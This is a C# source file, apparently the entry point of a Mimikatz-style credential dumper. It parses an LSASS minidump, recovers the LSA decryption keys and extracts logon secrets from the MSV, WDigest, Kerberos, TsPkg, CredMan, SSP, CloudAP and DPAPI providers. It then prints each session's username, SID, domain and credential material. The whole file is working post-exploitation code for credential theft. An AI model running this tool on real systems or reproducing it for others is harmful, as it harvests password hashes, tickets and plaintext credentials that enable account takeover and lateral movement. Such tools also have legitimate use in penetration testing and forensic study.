using Minidump.Decryptor;
using Minidump.Streams;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.IO;

namespace Minidump
{
    public class Program
    {
        public struct MiniDump
        {
            public Header.MinidumpHeader header;
            public SystemInfo.MINIDUMP_SYSTEM_INFO sysinfo;
            public List<ModuleList.MinidumpModule> modules;
            public MINIDUMP_MEMORY64.MinidumpMemory64List memory_segments_64;
            public MINIDUMP_MEMORY86.MinidumpMemory86List memory_segments;
            public BinaryReader fileBinaryReader;
            public LsaDecryptor.LsaKeys lsakeys;
            public List<Logon> logonlist;
            public List<KerberosSessions.KerberosLogonItem> klogonlist;
        }

        public static void parse(byte[] bytes)
        {

            MiniDump minidump = new MiniDump();
            using (BinaryReader fileBinaryReader = new BinaryReader(new MemoryStream(bytes)))
            {
                // parse header && streams
                minidump.fileBinaryReader = fileBinaryReader;
                minidump.header = Header.ParseHeader(minidump);
                List<Streams.Directory.MINIDUMP_DIRECTORY> directories = Streams.Directory.ParseDirectory(minidump);
                Parse.parseMM(ref minidump, directories);
                //Helpers.PrintProperties(minidump.header);
                //Helpers.PrintProperties(minidump.sysinfo);
                //Helpers.PrintProperties(minidump.modules);
                //Helpers.PrintProperties(minidump.MinidumpMemory64List);

                minidump.sysinfo.msv_dll_timestamp = 0;
                foreach (ModuleList.MinidumpModule mod in minidump.modules)
                {
                    if (mod.name.Contains("lsasrv.dll"))
                    {
                        minidump.sysinfo.msv_dll_timestamp = (int)mod.timestamp;
                        break;
                    }
                }

                // parse lsa
                minidump.lsakeys = LsaDecryptor.choose(minidump, lsaTemplate.get_template(minidump.sysinfo));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.iv));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.des_key));
                //Console.WriteLine(Helpers.ByteArrayToString(minidump.lsakeys.aes_key));

                // parse sessions
                minidump.logonlist = LogonSessions.FindSessions(minidump, msv.get_template(minidump.sysinfo));
                minidump.klogonlist = KerberosSessions.FindSessions(minidump, (kerberos.get_template(minidump.sysinfo)));

                //parse credentials
                try
                {
                    Msv1_.FindCredentials(minidump, msv.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"MSV failed: {e.Message}");
                }
                
                try
                {
                    WDigest_.FindCredentials(minidump, wdigest.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"WDigest failed: {e.Message}");
                }
                
                try
                {
                    Kerberos_.FindCredentials(minidump, kerberos.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Kerberos failed: {e.Message}");
                }
                
                try
                {
                    Tspkg_.FindCredentials(minidump, tspkg.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"TsPkg failed: {e.Message}");
                }
                
                try
                {
                    Credman_.FindCredentials(minidump, credman.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Credman failed: {e.Message}");
                }
                
                try
                {
                    Ssp_.FindCredentials(minidump, ssp.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"SSP failed: {e.Message}");
                }
                
                //try
                //{
                //    LiveSsp_.FindCredentials(minidump, livessp.get_template(minidump.sysinfo));
                //}
                //catch (Exception e)
                //{
                //    Console.WriteLine($"LiveSSP failed: {e.Message}");
                //}
                
                try
                {
                    Cloudap_.FindCredentials(minidump, cloudap.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"CloudAP failed: {e.Message}");
                }
                
                try
                {
                    Dpapi_.FindCredentials(minidump, dpapi.get_template(minidump.sysinfo));
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Dpapi failed: {e.Message}");
                }

                foreach (Logon log in minidump.logonlist)
                {
                    try
                    {
                        if (log.Wdigest != null || log.Msv != null || log.Kerberos != null || log.Tspkg != null || log.Credman != null || log.Ssp != null || log.LiveSsp != null || log.Dpapi != null || log.Cloudap != null)
                        {
                            Console.WriteLine("=====================================================================");
                            //Helpers.PrintProperties(log);
                            Console.WriteLine($"[*] LogonId:     {log.LogonId.HighPart}:{log.LogonId.LowPart}");
                            if (!string.IsNullOrEmpty(log.LogonType))
                                Console.WriteLine($"[*] LogonType:   {log.LogonType}");
                            Console.WriteLine($"[*] Session:     {log.Session}");
                            if(log.LogonTime.dwHighDateTime != 0)
                                Console.WriteLine($"[*] LogonTime:   {Helpers.ToDateTime(log.LogonTime):yyyy-MM-dd HH:mm:ss}");
                            Console.WriteLine($"[*] UserName:    {log.UserName}");
                            if (!string.IsNullOrEmpty(log.SID))
                                Console.WriteLine($"[*] SID:         {log.SID}");
                            if (!string.IsNullOrEmpty(log.LogonDomain))
                                Console.WriteLine($"[*] LogonDomain: {log.LogonDomain}");
                            if(!string.IsNullOrEmpty(log.LogonServer))
                                Console.WriteLine($"[*] LogonServer: {log.LogonServer}");
                        }
                        if (log.Msv != null)
                        {
                            Helpers.PrintProperties(log.Msv, "[*] Msv", 4);
                        }
                        if (log.Kerberos != null)
                        {
                            Helpers.PrintProperties(log.Kerberos, "[*] Kerberos", 4);
                        }
                        if (log.Wdigest != null)
                        {
                            foreach (WDigest wd in log.Wdigest)
                                Helpers.PrintProperties(wd, "[*] Wdigest", 4);
                        }
                        if (log.Ssp != null)
                        {
                            foreach (Ssp s in log.Ssp)
                                Helpers.PrintProperties(s, "[*] Ssp", 4);
                        }
                        if (log.Tspkg != null)
                        {
                            foreach (Tspkg ts in log.Tspkg)
                                Helpers.PrintProperties(ts, "[*] TsPkg", 4);
                        }
                        if (log.Credman != null)
                        {
                            foreach (CredMan cm in log.Credman)
                                Helpers.PrintProperties(cm, "[*] CredMan", 4);
                        }
                        if (log.Dpapi != null)
                        {
                            foreach (Dpapi dpapi in log.Dpapi)
                                Helpers.PrintProperties(dpapi, "[*] Dpapi", 4);
                        }
                        if (log.Cloudap != null)
                        {
                            foreach (Cloudap cap in log.Cloudap)
                                Helpers.PrintProperties(cap, "[*] CloudAp", 4);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"{e.Message}");
                    }
                }
            }
        }
    }
}